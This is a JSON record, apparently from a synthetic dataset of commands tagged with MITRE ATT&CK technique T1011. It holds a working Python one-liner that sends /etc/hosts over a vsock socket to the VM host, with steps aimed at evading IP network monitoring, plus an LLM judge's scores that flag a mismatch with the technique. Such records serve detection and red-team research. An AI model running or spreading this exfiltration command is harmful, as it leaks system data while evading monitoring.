{
  "technique_id": "T1011",
  "platform": "Linux",
  "shell": "Python",
  "command": "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 60917)); s.sendall(open('/etc/hosts','rb').read()); s.close()\"",
  "explanation": "Sends /etc/hosts over a virtual socket to the host (CID 2), leveraging a transport outside the primary IP stack in accordance with T1011.",
  "rationale_steps": [
    "Use vsock to bypass IP network monitoring pathways.",
    "Select a high, atypical vsock port (60917).",
    "Read /etc/hosts and send the bytes over vsock.",
    "Close the connection to minimize footprint."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1011-2e02ce6e-ffa89360",
  "source_prompt_hash": "2e02ce6e",
  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The Python one-liner is well-formed with balanced quotes/parentheses and valid socket and file operations.",
        "semantic_score": 2,
        "semantic_justification": "Although it plausibly sends /etc/hosts over a vsock to CID 2, it does not implement System Script Proxy Execution as described (it uses Python vsock, not trusted/signed system scripts), so it is misaligned with the stated technique.",
        "combined_score": 3.5,
        "confidence": 0.9,
        "timestamp": "2025-10-01T21:29:31.533736Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 2.0,
    "llm_average_score": 3.5,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}